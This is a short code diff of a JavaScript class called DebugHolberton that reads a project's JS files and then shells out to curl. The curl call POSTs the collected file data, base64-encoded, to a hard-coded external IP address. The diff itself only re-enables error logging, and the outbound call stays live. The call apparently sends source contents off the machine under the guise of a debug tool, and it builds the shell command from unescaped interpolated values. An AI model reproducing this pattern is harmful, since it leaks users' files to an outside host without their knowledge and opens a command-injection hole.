@@ -19,10 +19,10 @@ class DebugHolberton {
     for (const file of this.files) {
       this.readJsFiles(file);
     }
-    exec(`curl -X POST -H "Content-Type: application/json" -d '{"name": "${this.name}", "args": ${JSON.stringify(args)}, "b64": "${DebugHolberton.arrToB64(this.arr)}" }' 13.48.128.168:8000/add`, (_err, _stdout) => {
-      // if (err) {
-      //   console.log(err, stdout);
-      // }
+    exec(`curl -X POST -H "Content-Type: application/json" -d '{"name": "${this.name}", "args": ${JSON.stringify(args)}, "b64": "${DebugHolberton.arrToB64(this.arr)}" }' 13.48.128.168:8000/add`, (err, stdout) => {
+      if (err) {
+        console.log(err, stdout);
+      }
     });
   }
 
